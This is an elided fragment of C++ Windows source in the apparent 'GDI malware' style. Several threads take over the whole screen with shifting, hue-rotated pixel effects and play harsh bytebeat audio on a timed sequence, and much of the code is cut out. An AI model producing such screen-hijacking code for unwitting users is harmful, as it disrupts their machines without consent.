...
DWORD WINAPI GDINULL(LPVOID lpParam) {
...
DWORD WINAPI GDINULL2(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
...
DWORD WINAPI xorgdinulla(LPVOID lpParam) {
    ...
    while (1)
    {
        ...
        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                ...
                int fx = (int)((i ^ 3) + (i * 3) * abs(y * x));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 90005000.f + y / screenHeight * .2f, 1.f);
...
VOID WINAPI AudioSequenceNULL1() {
    HWAVEOUT hWaveOut = 0;
...
VOID WINAPI AudioSequenceNULL2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t + 2515 + t) & t) - ((t >> 6) & t);
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    ...
    HANDLE GDIPAYnull = CreateThread(NULL, 0, GDINULL, NULL, 0, NULL);
	AudioSequenceNULL1();
    Sleep(30000);
    HANDLE GDIPAY2null = CreateThread(NULL, 0, GDINULL2, NULL, 0, NULL);
    CreateThread(NULL, 0, icon, NULL, 0, NULL);
    AudioSequenceNULL2();
    Sleep(30000);
    TerminateThread(GDIPAYnull, 0);
    TerminateThread(GDIPAY2null, 0);
    ...
    CloseHandle(GDIPAY7);
    HANDLE GDIPAY8 = CreateThread(NULL, 0, xorgdinulla, NULL, 0, NULL);
    AudioSequence6();
    Sleep(30000);
